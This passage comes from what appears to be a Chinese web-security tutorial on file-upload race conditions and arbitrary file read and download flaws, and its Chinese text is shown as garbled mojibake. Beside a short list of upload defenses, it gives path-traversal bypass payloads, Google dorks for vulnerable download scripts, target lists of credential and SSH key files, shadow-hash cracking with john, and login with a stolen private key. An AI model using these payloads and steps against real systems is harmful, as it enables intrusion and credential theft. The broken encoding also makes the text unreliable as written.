//å¦åˆ™è¿”å›\"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\"æ•°æ®ã€‚ unlink($upload_file);// å¹¶åˆ é™¤è¿™ä¸ªæ–‡ä»¶ } }else{ $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } ä»£ç å¤„ç†æµç¨‹ï¼šå£°æ˜ä¸€ä¸ªæ•°ç»„ï¼Œä¿å­˜ç€å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹â€“&gt;è·å–æ–‡ä»¶åå’Œæ–‡ä»¶ä¸´æ—¶å­˜å‚¨è·¯å¾„â€“&gt;æˆªå–æ–‡ä»¶åâ€“&gt;æ„é€ æ–‡ä»¶ä¸Šä¼ åçš„å­˜å‚¨è·¯å¾„â€“&gt;å¯¹æ–‡ä»¶è¿›è¡Œè½¬å­˜â€“&gt;æ¯”å¯¹ç™½åå•ï¼Œå¦‚æœå­˜åœ¨å°±å¯¹æ–‡ä»¶è¿›è¡Œé‡å‘½åâ€“&gt;å¦åˆ™å°±åˆ é™¤æ–‡ä»¶ã€‚ é€šè¿‡ä¸Šé¢ä»£ç æˆ‘ä»¬å‘ç°ï¼š æœåŠ¡å™¨å…ˆé€šè¿‡move_uploaded_fileå‡½æ•°æŠŠæ–‡ä»¶ä¿å­˜äº†ï¼Œç„¶åå†å»åˆ¤æ–­åç¼€åæ˜¯å¦åˆæ³•ï¼Œåˆæ³•å°±é‡å‘½åï¼Œå¦‚æœä¸åˆæ³•å†åˆ é™¤ã€‚é‡ç‚¹åœ¨äºï¼Œåœ¨å¤šçº¿ç¨‹æƒ…å†µä¸‹ï¼Œå°±æœ‰å¯èƒ½å‡ºç°è¿˜æ²¡å¤„ç†å®Œï¼Œæˆ‘ä»¬å°±è®¿é—®äº†åŸæ–‡ä»¶ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´é˜²æŠ¤è¢«ç»•è¿‡ã€‚ æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ä¸Šå»ï¼Œåç«¯ä¼šæ£€éªŒä¸Šä¼ æ–‡ä»¶æ˜¯å¦å’Œè¦æ±‚çš„æ–‡ä»¶æ˜¯å¦ä¸€è‡´ã€‚å¦‚æœä¸èƒ½è¾¾åˆ°è¦æ±‚å°±ä¼šåˆ é™¤æ–‡ä»¶ï¼Œå¦‚æœè¾¾æˆè¦æ±‚å°±ä¼šä¿ç•™ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ä¸Šå»çš„æ—¶å€™ï¼Œæ£€æµ‹æ˜¯å¦åˆ°è¾¾è¦æ±‚éœ€è¦ä¸€å®šçš„æ—¶é—´ï¼Œè¿™ä¸ªæ—¶é—´å¯é•¿å¯çŸ­ï¼Œä½†æ˜¯æˆ‘ä»¬ç¡®ç¡®å®å®åœ¨æŸä¸€åˆ»æ–‡ä»¶å·²ç»ä¸Šä¼ åˆ°äº†æŒ‡å®šåœ°å€ï¼Œå¹¶ä¸”è®¿é—®åˆ°è¿™ä¸ªæ–‡ä»¶ã€‚è¿™æ—¶å€™å°±ä¼šé€ æˆæ¡ä»¶ç«äº‰ã€‚ å‚è€ƒ: ã€æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ã€‘â€”â€”æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸºç¡€å…¥é—¨ å¤ªå‰å®³äº†ï¼Œç»ˆäºæœ‰äººèƒ½æŠŠæ–‡ä»¶ä¸Šä¼ æ¼æ´è®²çš„æ˜æ˜ç™½ç™½äº†â€”è¿™é‡Œè¿˜è®²äº†webshellç›¸å…³å†…å®¹ äº”ã€é˜²å¾¡æŠ€å·§ 1ã€æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•è®¾ç½®ä¸ºä¸å¯æ‰§è¡Œã€‚åªè¦webå®¹å™¨æ— æ³•è§£æè¯¥ç›®å½•ä¸‹é¢çš„æ–‡ä»¶ï¼Œå³ä½¿æ”»å‡»è€…ä¸Šä¼ äº†è„šæœ¬æ–‡ä»¶ï¼ŒæœåŠ¡å™¨æœ¬èº«ä¹Ÿä¸ä¼šå—åˆ°å½±å“ã€‚ 2ã€åˆ¤æ–­æ–‡ä»¶ç±»å‹ã€‚åœ¨åˆ¤æ–­æ–‡ä»¶ç±»å‹æ—¶ï¼Œå¯ä»¥ç»“åˆä½¿ç”¨MIME Typeã€åç¼€æ£€æŸ¥ç­‰æ–¹å¼ã€‚åœ¨æ–‡ä»¶ç±»å‹æ£€æŸ¥ä¸­ï¼Œå¼ºçƒˆæ¨èç™½åå•æ–¹å¼ï¼Œé»‘åå•çš„æ–¹å¼å·²ç»æ— æ•°æ¬¡è¢«è¯æ˜æ˜¯ä¸å¯é çš„ï¼Œä¸¥æ ¼è¿‡æ»¤æ‰©å±•åä¸ºâ€œ.phpã€.aspã€.batâ€ç­‰å¯æ‰§è¡Œæ–‡ä»¶ä¸Šä¼ ã€‚æ­¤å¤–ï¼Œå¯¹äºå›¾ç‰‡çš„å¤„ç†ï¼Œå¯ä»¥ä½¿ç”¨å‹ç¼©å‡½æ•°æˆ–è€…resizeå‡½æ•°ï¼Œåœ¨å¤„ç†å›¾ç‰‡çš„åŒæ—¶ç ´åå›¾ç‰‡ä¸­å¯èƒ½åŒ…å«çš„HTMLä»£ç ã€‚ 3ã€ä½¿ç”¨éšæœºæ•°æ”¹å†™æ–‡ä»¶åå’Œæ–‡ä»¶è·¯å¾„ã€‚æ–‡ä»¶ä¸Šä¼ å¦‚æœè¦æ‰§è¡Œä»£ç ï¼Œåˆ™éœ€è¦ç”¨æˆ·èƒ½å¤Ÿè®¿é—®åˆ°è¿™ä¸ªæ–‡ä»¶ã€‚åœ¨æŸäº›ç¯å¢ƒä¸­ï¼Œç”¨æˆ·èƒ½ä¸Šä¼ ï¼Œä½†ä¸èƒ½è®¿é—®ã€‚å¦‚æœåº”ç”¨äº†éšæœºæ•°æ”¹å†™äº†æ–‡ä»¶åå’Œè·¯å¾„ï¼Œå°†æå¤§åœ°å¢åŠ æ”»å‡»çš„æˆæœ¬ã€‚å†æ¥å°±æ˜¯åƒshell.php.rar.rarå’Œcrossdomain.xmlè¿™ç§æ–‡ä»¶ï¼Œéƒ½å°†å› ä¸ºé‡å‘½åè€Œæ— æ³•æ”»å‡»ã€‚ 4ã€å•ç‹¬è®¾ç½®æ–‡ä»¶æœåŠ¡å™¨çš„åŸŸåã€‚ç”±äºæµè§ˆå™¨åŒæºç­–ç•¥çš„å…³ç³»ï¼Œä¸€ç³»åˆ—å®¢æˆ·ç«¯æ”»å‡»å°†å¤±æ•ˆï¼Œæ¯”å¦‚ä¸Šä¼ crossdomain.xmlã€ä¸Šä¼ åŒ…å«Javascriptçš„XSSåˆ©ç”¨ç­‰é—®é¢˜å°†å¾—åˆ°è§£å†³ã€‚ 5ã€ä½¿ç”¨å®‰å…¨è®¾å¤‡é˜²å¾¡ã€‚æ–‡ä»¶ä¸Šä¼ æ”»å‡»çš„æœ¬è´¨å°±æ˜¯å°†æ¶æ„æ–‡ä»¶æˆ–è€…è„šæœ¬ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œä¸“ä¸šçš„å®‰å…¨è®¾å¤‡é˜²å¾¡æ­¤ç±»æ¼æ´ä¸»è¦æ˜¯é€šè¿‡å¯¹æ¼æ´çš„ä¸Šä¼ åˆ©ç”¨è¡Œä¸ºå’Œæ¶æ„æ–‡ä»¶çš„ä¸Šä¼ è¿‡ç¨‹è¿›è¡Œæ£€æµ‹ã€‚æ¶æ„æ–‡ä»¶åƒå˜ä¸‡åŒ–ï¼Œéšè—æ‰‹æ³•ä¹Ÿä¸æ–­æ¨é™ˆå‡ºæ–°ï¼Œå¯¹æ™®é€šçš„ç³»ç»Ÿç®¡ç†å‘˜æ¥è¯´å¯ä»¥é€šè¿‡éƒ¨ç½²å®‰å…¨è®¾å¤‡æ¥å¸®åŠ©é˜²å¾¡ã€‚ 6ã€éšè—æ–‡ä»¶ä¸Šä¼ ç›®å½•ï¼Œç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„ç›®æ ‡ç›®å½•å¯¹ç”¨æˆ·éšè—ã€‚ å…­ã€å¦‚ä½•æ„é€ ä¼˜è´¨FUZZå­—å…¸ æ„é€ ä¼˜è´¨ä¸Šä¼ æ¼æ´Fuzzå­—å…¸ 0x02 æ–‡ä»¶è¯»å–ä¸ä¸‹è½½ æ–‡ä»¶è¯»å–å¸¸è§å‡½æ•°: fopen file_get_contents fread fgets fgetss file fpassthru parse_ini_file readfile 1. ä¸ºä»€ä¹ˆäº§ç”Ÿä»»æ„æ–‡ä»¶è¯»å–ä¸ä¸‹è½½æ¼æ´ ä¸€äº›ç½‘ç«™çš„ä¸šåŠ¡éœ€è¦ï¼Œå¯èƒ½æä¾›æ–‡ä»¶æŸ¥çœ‹æˆ–ä¸‹è½½çš„åŠŸèƒ½ï¼Œå¦‚æœå¯¹ç”¨æˆ·æŸ¥çœ‹æˆ–ä¸‹è½½çš„æ–‡ä»¶ä¸åšé™åˆ¶ï¼Œå°±èƒ½å¤ŸæŸ¥çœ‹æˆ–ä¸‹è½½ä»»æ„çš„æ–‡ä»¶ï¼Œå¯ä»¥æ˜¯æºæ–‡ä»¶ï¼Œæ•æ„Ÿæ–‡ä»¶ç­‰ç­‰ã€‚ 2. ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ ä»»æ„æ–‡ä»¶è¯»å–æ˜¯å±äºæ–‡ä»¶æ“ä½œæ¼æ´çš„ä¸€ç§ï¼Œä¸€èˆ¬ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¯ä»¥è¯»å–é…ç½®ä¿¡æ¯ç”šè‡³ç³»ç»Ÿé‡è¦æ–‡ä»¶ã€‚ä¸¥é‡çš„è¯ï¼Œå°±å¯èƒ½å¯¼è‡´SSRFï¼Œè¿›è€Œæ¼«æ¸¸è‡³å†…ç½‘ã€‚ æ¼æ´äº§ç”ŸåŸå›  å­˜åœ¨è¯»å–æ–‡ä»¶çš„å‡½æ•° è¯»å–æ–‡ä»¶çš„è·¯å¾„ç”¨æˆ·å¯æ§ï¼Œä¸”æœªæ ¡éªŒæˆ–æ ¡éªŒä¸ä¸¥ è¾“å‡ºäº†æ–‡ä»¶å†…å®¹ ä»»æ„æ–‡ä»¶è¯»å– &lt;?php $filename=â€test.txtâ€; readfile($filename); ?&gt; &lt;?php $filename=â€test.txtâ€; echo file_get_contents($filename); ?&gt; æ–‡ä»¶è¯»å–å‡½æ•° readfile()ã€file_get_contents()ã€fopen()ä¸­ï¼Œ$filenameæ²¡æœ‰ç»è¿‡æ ¡éªŒæˆ–è€…æ ¡éªŒä¸åˆæ ¼ï¼Œç”¨æˆ·å¯æ§åˆ¶å˜é‡è¯»å–ä»»æ„æ–‡ä»¶ï¼Œå¦‚/etc/passwdã€./index.phpã€/config.iniã€‚ 3. æ–‡ä»¶è¯»å–æ¼æ´æŒ–æ˜ 1ã€webæ¼æ´æ‰«æå™¨ï¼ˆawvsã€appscanã€openvasã€nessusï¼‰ 2ã€æ‰‹åŠ¨æŒ–æ˜ä»è¿æ¥å’Œå‚æ•°åæŸ¥çœ‹ Google search inurl:â€readfile.php?file= inurl:â€read.php?filename= inurl:â€download.php?file= inurl:â€down.php?file= è¿æ¥ï¼š readfile.php?file=**.txt download.php?file=**.rar å‚æ•°åï¼š &amp;RealPath=ã€&amp;readpath=ã€&amp;FilePath=ã€&amp;filepath=ã€&amp;Path=ã€&amp;path=ã€&amp;Inputfile=ã€&amp;inputfile=ã€&amp;url=ã€&amp;urls=ã€&amp;Lang=ã€&amp;dis=ã€&amp;Data=ã€&amp;data=ã€&amp;readfile=ã€&amp;ï¬lep=ã€&amp;Src=ã€&amp;src=ã€&amp;menu=ã€META-INF= ã€WEB-INF 4. æ•æ„Ÿä¿¡æ¯ Windowsï¼š C:\\boot.ini //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IISé…ç½®æ–‡ä»¶ C:\\Windows\\repair\\sam //å­˜å‚¨ç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç  C:\\Program Files\\mysql\\my.ini //Mysqlé…ç½® C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root C:\\Windows\\php.ini //phpé…ç½®ä¿¡æ¯ C:\\Windows\\my.ini //Mysqlé…ç½®ä¿¡æ¯ Linuxï¼š /root/.ssh/authorized_keys //å¦‚éœ€ç™»å½•åˆ°è¿œç¨‹ä¸»æœºï¼Œéœ€è¦åˆ°.sshç›®å½•ä¸‹ï¼Œæ–°å»ºauthorized_keysæ–‡ä»¶ï¼Œå¹¶å°†id_rsa.pubå†…å®¹å¤åˆ¶è¿›å» /root/.ssh/id_rsa //sshç§é’¥,sshå…¬é’¥æ˜¯id_rsa.pub /root/.ssh/id_ras.keystore //è®°å½•æ¯ä¸ªè®¿é—®è®¡ç®—æœºç”¨æˆ·çš„å…¬é’¥ /root/.ssh/known_hosts //sshä¼šæŠŠæ¯ä¸ªè®¿é—®è¿‡è®¡ç®—æœºçš„å…¬é’¥(public key)éƒ½è®°å½•åœ¨~/.ssh/known_hostsã€‚å½“ä¸‹æ¬¡è®¿é—®ç›¸åŒè®¡ç®—æœºæ—¶ï¼ŒOpenSSHä¼šæ ¸å¯¹å…¬é’¥ã€‚å¦‚æœå…¬é’¥ä¸åŒï¼ŒOpenSSHä¼šå‘å‡ºè­¦å‘Šï¼Œ é¿å…ä½ å—åˆ°DNS Hijackä¹‹ç±»çš„æ”»å‡»ã€‚ /etc/passwd // è´¦æˆ·ä¿¡æ¯ /etc/shadow // è´¦æˆ·å¯†ç æ–‡ä»¶ /etc/my.cnf //mysql é…ç½®æ–‡ä»¶ /etc/httpd/conf/httpd.conf // Apacheé…ç½®æ–‡ä»¶ /root/.bash_history //ç”¨æˆ·å†å²å‘½ä»¤è®°å½•æ–‡ä»¶ /root/.mysql_history //mysqlå†å²å‘½ä»¤è®°å½•æ–‡ä»¶ /proc/self/fd/fd[0-9]*(æ–‡ä»¶æ ‡è¯†ç¬¦) /proc/mounts //è®°å½•ç³»ç»ŸæŒ‚è½½è®¾å¤‡ /porc/config.gz //å†…æ ¸é…ç½®æ–‡ä»¶ /var/lib/mlocate/mlocate.db //å…¨æ–‡ä»¶è·¯å¾„ /porc/self/cmdline //å½“å‰è¿›ç¨‹çš„cmdlineå‚æ•° 5. ç»•è¿‡æ€è·¯ å¯ä»¥è¿›è¡Œfuzz 1. urlç¼–ç ä»£æ›¿.æˆ–è€…/ï¼Œå¦‚ä½¿ç”¨%2Fä»£æ›¿/ ?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd 2. äºŒæ¬¡ç¼–ç (%25) ?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd 3. åŠ å…¥+ ?filename=.+./.+./bin/redacted.dll 4. %00 ?filename=.%00./file.php /etc/passwd%00.jpg 5. \\ ?filename=..%5c..%5c/windows/win.ini 6. Java %c0%ae å®‰å…¨æ¨¡å¼ç»•è¿‡ ?filename=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd 6. Linuxä¸‹çš„å¸¸è§åˆ©ç”¨å§¿åŠ¿ 6.1 ç”¨æˆ·ç›®å½•ä¸‹çš„æ•æ„Ÿæ–‡ä»¶ .bash_history .zsh_history .psql_history .mysql_history .profile .bashrc .gitconfig .viminfo ä»»æ„æ–‡ä»¶è¯»å–/etc/passwd æå–passwdç¬¬ä¸€åˆ—ï¼Œå³rootç­‰ä¸€ç³»åˆ—ç”¨æˆ·å è¯»historyï¼š../../root/.bash_history æš´ç ´æ‰€æœ‰ç”¨æˆ·çš„.bash_historyï¼š../../../home/Â§rootÂ§/.bash_history å†å²å‘½ä»¤é‡ç‚¹å…³æ³¨å‡ºç°çš„å¯†ç ã€è·¯å¾„ã€é…ç½®æ–‡ä»¶è·¯å¾„ã€å…¶ä»–å…³è”IPã€æ—¥å¿—æ–‡ä»¶ã€waråŒ…ã€å¤‡ä»½æ–‡ä»¶è·¯å¾„ç­‰ç­‰ï¼Œå¯è¿›ä¸€æ­¥è¯»å–æˆ–åˆ©ç”¨ã€‚ PSï¼šå¦‚è¦ä¸‹è½½æ–‡ä»¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´è¿‡å¤§æ–‡ä»¶ä¸‹è½½å¤±è´¥ï¼Œå¯ä»¥ä½¿ç”¨wgetè¿›è¡Œä¸‹è½½ï¼Œæ¯”å¦‚catanlina.outæ—¥å¿—æ–‡ä»¶ã€waråŒ…ã€å¤‡ä»½æ–‡ä»¶ç­‰ç­‰ã€‚ 6.2 ä¸»æœºå‡­è¯æ–‡ä»¶ ç§é’¥æ–‡ä»¶ /root/.ssh/id_rsa ç§é’¥ /root/.ssh/authorized_keys å…¬é’¥å­˜å‚¨æ–‡ä»¶ /root/.ssh/id_rsa.keystore /root/.ssh/known_hosts //è®°å½•æ¯ä¸ªè®¿é—®è®¡ç®—æœºç”¨æˆ·çš„å…¬é’¥ ç§é’¥æ–‡ä»¶å¦‚æœæ²¡æœ‰è®¾å®šå¯†ç ä¿æŠ¤ï¼Œä¾¿å¯ç›´æ¥è·å–åˆ°è¿›è¡Œç™»å½•åˆ°æœåŠ¡å™¨ï¼Œæˆ–ä½¿ç”¨xshellç­‰è½¯ä»¶é€‰æ‹©è¯ä¹¦ç™»å½•ã€‚ ssh -i id_rsa root@IPåœ°å€ ç³»ç»Ÿå¯†ç  /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin ...... ç”¨æˆ·å:å£ä»¤:ç”¨æˆ·æ ‡è¯†å·:ç»„æ ‡è¯†å·:æ³¨é‡Šæ€§æè¿°:ä¸»ç›®å½•:ç™»å½•Shell å¯ä»¥çœ‹åˆ°å“ªäº›ç”¨æˆ·å¯ä»¥ç™»å½• /etc/shadow root:$1$v2wT9rQF$XSpGgoB93STC4EFSlgpjg1:14181:0:99999:7::: $id$salt$å¯†æ–‡ idä»£è¡¨çš„æ˜¯ä½¿ç”¨ä¸åŒçš„åŠ å¯†ç®—æ³•ï¼Œä¸åŒçš„ç³»ç»Ÿä½¿ç”¨çš„ç®—æ³•ä¹Ÿä¸å°½ç›¸åŒã€‚saltæ˜¯åŠ å¯†çš„æ—¶å€™éœ€è¦ç”¨åˆ°ç›ã€‚æœ€åå°±æ˜¯å¯†æ–‡ã€‚ æ³¨æ„ï¼šå¦‚æœå¯†ç å­—ç¬¦ä¸²ä¸º*ï¼Œè¡¨ç¤ºç³»ç»Ÿç”¨æˆ·ä¸èƒ½è¢«ç™»å…¥ï¼Œä¸º!è¡¨ç¤ºç”¨æˆ·åè¢«ç¦ç”¨ï¼Œå¦‚æœå¯†ç å­—ç¬¦ä¸²ä¸ºç©ºï¼Œè¡¨ç¤ºæ²¡æœ‰å¯†ç ã€‚ æ ¼å¼ ç®—æ³• $1 md5 $2a blowfish $2y blowfish $5 sha-256 $6 sha-512 åœ¨çº¿æŸ¥è¯¢ https://www.cmd5.com/ johnç ´è§£ unshadow /etc/passwd /etc/shadow &gt; test_passwd john --wordlist=å­—å…¸è·¯å¾„ test_passw é»˜è®¤å¯†ç å­—å…¸ä½äº/usr/share/john/password.ls 6.3 å…¨è·¯å¾„ mlocate.dbæ•°æ®åº“é‡Œå­˜å‚¨äº†æœ¬åœ°æ‰€æœ‰æ–‡ä»¶çš„é…ç½®ä¿¡æ¯ /var/lib/mlocate/mlocate.db åˆ©ç”¨locateå‘½ä»¤å°†æ•°æ®è¾“å‡ºæˆæ–‡ä»¶ï¼Œè¿™é‡Œé¢åŒ…å«äº†å…¨éƒ¨çš„æ–‡ä»¶è·¯å¾„ä¿¡æ¯ locate mlocate.db configæŠŠåŒ…å«configçš„è·¯å¾„å…¨è¾“å‡ºå‡ºæ¥ locate mlocate.db webapps locate mlocate.db www è·å–åˆ°è·¯å¾„åå¯ä»¥è¿›ä¸€æ­¥æŒ–æ˜æ•æ„Ÿä¿¡æ¯å’Œç³»ç»Ÿæ¼æ´ 7. ç¨‹åºæºä»£ç  åˆ©ç”¨å…¨è·¯å¾„æˆ–è€…å…¶ä»–åœ°æ–¹è·å–åˆ°çš„è·¯å¾„è¯»å–ä¸€äº›å…³é”®çš„ç¨‹åºæºç ã€‚ è¯»å–WEB-INF/web.xmlï¼Œè¿›ä¸€æ­¥è¯»å–classæ–‡ä»¶ï¼Œåç¼–è¯‘å¾—åˆ°æºç ã€‚ è¯»å–waråŒ…ï¼Œåç¼–è¯‘è·å–æºç ã€‚ 8. åº”ç”¨é…ç½®æ–‡ä»¶ è·å–åˆ°ç½‘ç«™çš„ç›¸å…³é…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç«™ç‚¹é…ç½®ã€æ•°æ®åº“é…ç½®ç­‰ç­‰ï¼Œä¹Ÿå¯è¿›ä¸€æ­¥è·å–åˆ°æºç ã€‚ javaç«™ç‚¹ /WEB-INF/web.xml /WEB-INF/classes/applicationContext.xml /WEB-INF/classes/xxx/xxx/xxx.class core.jarå¦‚æœé‡åˆ°Shiroç«™ç‚¹ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨å…¨è·¯å¾„æ‰¾åˆ°core.jarï¼Œå»ä¸‹è½½core.jarï¼Œä¸‹è½½ååç¼–è¯‘æœç´¢Base64.decodeç›´æ¥æ‰¾keyï¼Œè¿›è€Œgetshellã€‚ tomcat /usr/local/tomcat/conf/tomcat-users.xml nginx /www/nginx/conf/nginx.conf /etc/nginx/nginx.conf /usr/local/nginx/conf/nginx.conf /usr/local/etc/nginx/nginx.conf apache /etc/httpd/conf/httpd.conf /etc/apache2/apache2.conf /etc/apache2/httpd.conf redis /etc/redis.conf ssh /etc/ssh/sshd_config 9. åº”ç”¨æ—¥å¿—æ–‡ä»¶ åˆ©ç”¨æ—¥å¿—æ–‡ä»¶è·å–ç½‘ç«™åå°åœ°å€ã€apiæ¥å£ã€å¤‡ä»½ã€ç­‰ç­‰æ•æ„Ÿä¿¡æ¯ã€‚ tomcat å¯ä»¥å…ˆæ‰¾åˆ°/tomcat/bin/catalina.shï¼Œé‡Œè¾¹æœ‰logçš„é…ç½®è·¯å¾„ /webapps/ROOT/logs/catalina.out apache /var/log/apache2/access.log /var/log/apache2/error.log /var/log/httpd/access_log /etc/httpd/logs/access_log /etc/httpd/logs/error_log /etc/httpd/logs/error.log nginx /var/log/nginx/access.log /var/log/nginx/error.log /usr/local/var/log/nginx/access.log /usr/local/nginx/logs 10. Windowsä¸‹çš„åˆ©ç”¨å§¿åŠ¿ 10.1 ç›²è¯»å–æ¡Œé¢æ–‡ä»¶ æœ‰äº›æ—¶å€™ï¼Œç®¡ç†å‘˜ä¼šå›¾æ–¹ä¾¿ï¼Œåœ¨æ¡Œé¢å­˜å‚¨ä¸€äº›æ•æ„Ÿçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å¯¹æ¡Œé¢çš„ä¸€äº›æ–‡ä»¶åè¿›è¡Œfuzzï¼Œæ¯”å¦‚1.txtã€2.txtã€å¯†ç .txtã€pass.txtç­‰ç­‰ï¼Œè¿›ä¸€æ­¥æ‰©å¤§æˆ˜æœã€‚ 5. ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ ä¸€äº›ç½‘ç«™ç”±äºä¸šåŠ¡éœ€æ±‚ï¼Œå¾€å¾€éœ€è¦æä¾›æ–‡ä»¶ä¸‹è½½åŠŸèƒ½ï¼Œä½†è‹¥å¯¹ç”¨æˆ·ä¸‹è½½çš„æ–‡ä»¶ä¸åšé™åˆ¶ï¼Œåˆ™æ¶æ„ç”¨æˆ·å°±èƒ½å¤Ÿä¸‹è½½ä»»æ„æ•æ„Ÿæ–‡ä»¶ï¼Œè¿™å°±æ˜¯æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚ æ¼æ´äº§ç”ŸåŸå›  æœ‰è¯»å–æ–‡ä»¶çš„å‡½æ•° è¯»ç‰©æ–‡ä»¶çš„è·¯å¾„ç”¨æˆ·å¯æ§ï¼Œä¸”æ²¡æœ‰ç»è¿‡æ ¡éªŒï¼Œæˆ–è€…æ ¡éªŒä¸ä¸¥æ ¼ è¾“å‡ºæ–‡ä»¶å†…å®¹ ä¸€ä¸ªæ­£å¸¸çš„ç½‘ç«™ï¼Œå­˜åœ¨ä¸€ä¸ªä¸‹è½½æ–‡ä»¶çš„åŠŸèƒ½ï¼ŒåŒæ—¶è¿˜ä¼šä»æµè§ˆå™¨æ¥æ”¶æ–‡ä»¶åå­— æ–‡ä»¶ä¸‹è½½çš„ä¸¤ç§æ–¹å¼ 1ã€ç›´æ¥ä¸‹è½½ï¼š &lt;a href=â€http://www.a.com/xxx.rarâ€&gt;ä¸‹è½½&lt;/a&gt; 2ã€å¢åŠ headerå¤´ &lt;?php $filename = $_GET['filename']; echo '&lt;h1&gt;å¼€å§‹ä¸‹è½½æ–‡ä»¶&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;'; echo file_get_contents($filename); header('Content-Type: imgage/jpeg'); header('Content-Disposition: attachment; filename='.$filename); header('Content-Lengh: '.filesize($filename)); ?&gt; åˆ©ç”¨æ€è·¯ ä¸‹è½½å¸¸è§„çš„é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚: ssh,weblogic,ftp,mysqlç­‰ç›¸å…³é…ç½® ä¸‹è½½å„ç§.logæ–‡ä»¶ï¼Œä»ä¸­å¯»æ‰¾ä¸€äº›åå°åœ°å€ï¼Œæ–‡ä»¶ä¸Šä¼ ç‚¹ä¹‹ç±»çš„åœ°æ–¹ï¼Œå¦‚æœè¿æ°”å¥½çš„è¯ä¼šè·å¾—ä¸€äº›å‰è¾ˆä»¬çš„åé—¨ã€‚ ä¸‹è½½webä¸šåŠ¡æ–‡ä»¶è¿›è¡Œç™½ç›’å®¡è®¡ï¼Œåˆ©ç”¨æ¼æ´è¿›ä¸€æ­¥æ”»å…¥æœåŠ¡å™¨ã€‚ å°è¯•è¯»å–/root/.bash_historyçœ‹è‡ªå·±æ˜¯å¦å…·æœ‰rootæƒé™ã€‚ å¦‚æœæ²¡æœ‰ï¼Œå°±åªèƒ½åˆ©ç”¨../æ¥å›è·³è½¬è¯»å–ä¸€äº›.sshä¸‹çš„é…ç½®ä¿¡æ¯æ–‡ä»¶ã€‚ è¯»å–mysqlä¸‹çš„.bash_historyæ–‡ä»¶ã€‚æ¥æŸ¥çœ‹æ˜¯å¦è®°å½•äº†ä¸€äº›å¯ä»¥åˆ©ç”¨çš„ç›¸å…³ä¿¡æ¯ã€‚ç„¶åé€ä¸ªä¸‹è½½éœ€è¦å®¡è®¡çš„ä»£ç æ–‡ä»¶ï¼Œä½†æ˜¯ä¸‹è½½çš„æ—¶å€™å˜å¾—å¾ˆç¹çï¼Œåªèƒ½å°è¯•å»çŒœè§£ç›®å½•ï¼Œç„¶åä¸‹è½½ä¸€äº›ä¸­é—´ä»¶çš„è®°å½•æ—¥å¿—è¿›è¡Œåˆ†æã€‚ å¸¸è§åˆ©ç”¨æ–¹å¼ java+oracleç¯å¢ƒ å¯ä»¥å…ˆä¸‹è½½/WEB-INF/classes/applicationContext.xml æ–‡ä»¶ï¼Œè¿™é‡Œé¢è®°è½½çš„æ˜¯webæœåŠ¡å™¨çš„ç›¸åº”é…ç½®ï¼Œç„¶åä¸‹è½½/WEB-INF/classes/xxx/xxx/aaa.classå¯¹æ–‡ä»¶è¿›è¡Œåç¼–è¯‘ï¼Œç„¶åæœç´¢æ–‡ä»¶ä¸­çš„uploadå…³é”®å­—çœ‹æ˜¯å¦å­˜åœ¨ä¸€äº›apiæ¥å£ï¼Œå¦‚æœå­˜åœ¨çš„è¯æˆ‘ä»¬å¯ä»¥æœ¬åœ°æ„é€ ä¸Šä¼ é¡µé¢ç”¨apiæ¥å£å°†æˆ‘ä»¬çš„æ–‡ä»¶ä¼ è¾“è¿›æœåŠ¡å™¨ã€‚ ä¹Ÿå¯ä»¥å…ˆä¸‹è½½ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼Œåœ¨æ ¹ç›®å½•/WEB-INF/Web.xmlçš„(ä¸€èˆ¬éƒ½æœ‰å¾ˆå¤šå†…å®¹,æœ‰æ—¶å«æœ‰æ•°æ®åº“è¿æ¥ç”¨æˆ·åå’Œå¯†ç ç­‰å…³é”®ä¿¡æ¯)ã€‚ å…·æœ‰rootæƒé™ åœ¨linuxä¸­æœ‰è¿™æ ·ä¸€ä¸ªå‘½ä»¤ locate æ˜¯ç”¨æ¥æŸ¥æ‰¾æ–‡ä»¶æˆ–ç›®å½•çš„ï¼Œå®ƒä¸æœç´¢å…·ä½“ç›®å½•ï¼Œè€Œæ˜¯æœç´¢ä¸€ä¸ªæ•°æ®åº“/var/lib/mlocate/mlocate.dbã€‚è¿™ä¸ªæ•°æ®åº“ä¸­å«æœ‰æœ¬åœ°æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯ã€‚Linuxç³»ç»Ÿè‡ªåŠ¨åˆ›å»ºè¿™ä¸ªæ•°æ®åº“ï¼Œå¹¶ä¸”æ¯å¤©è‡ªåŠ¨æ›´æ–°ä¸€æ¬¡ã€‚ 